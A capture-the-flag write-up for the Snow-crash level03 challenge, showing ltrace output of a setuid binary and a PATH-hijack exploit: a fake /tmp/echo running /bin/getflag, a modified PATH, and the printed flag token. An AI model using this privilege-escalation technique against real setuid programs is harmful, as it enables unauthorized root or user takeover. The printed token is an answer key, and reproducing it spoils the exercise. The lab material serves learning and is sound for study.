# Snow-crash - level03

* An binary as find in the home directory
```console
~$ ls -l
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
~$ ./level03
Exploit me
```

* Use [`ltrace`](https://man7.org/linux/man-pages/man1/ltrace.1.html), for intercept and print the system calls executed by the program
```console
~$ ltrace ./level03 
__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                               = 2003
geteuid()                                               = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)     = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)     = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                  = 0
+++ exited (status 0) +++
```

* `echo` called in `system` without full path
* Let's write another echo that calls getflag
```console
~$ echo "/bin/getflag" > /tmp/echo
~$ chmod +x /tmp/echo
~$ export PATH=/tmp:$PATH
~$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```